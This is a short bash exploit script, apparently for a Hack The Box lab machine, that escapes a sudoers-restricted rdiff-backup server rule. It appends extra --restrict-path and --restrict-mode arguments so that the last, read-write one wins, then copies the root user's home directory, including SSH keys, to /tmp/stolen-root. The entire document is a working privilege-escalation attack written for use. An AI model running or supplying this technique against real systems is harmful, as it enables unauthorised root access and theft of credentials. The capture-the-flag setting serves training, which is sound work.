#!/bin/bash
# HTB Management — sudo rdiff-backup 2.2.6 jailbreak
# Run ON the box as owen (NOPASSWD rdiff-backup --server … *).
# Last --restrict-path / --restrict-mode read-write wins over sudoers jail.
set -euo pipefail

OUT="${1:-/tmp/stolen-root}"
mkdir -p "$OUT"

SCHEMA='sudo -n /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-mode read-write --restrict-path {h}'

# {h} = "/"  →  HOST::PATH  is  /::/root  (remote source = target /root as root)
rdiff-backup --remote-schema "$SCHEMA" backup '/::/root' "$OUT"

echo "[+] mirrored /root → $OUT"
ls -la "$OUT" "$OUT/.ssh" 2>/dev/null || true
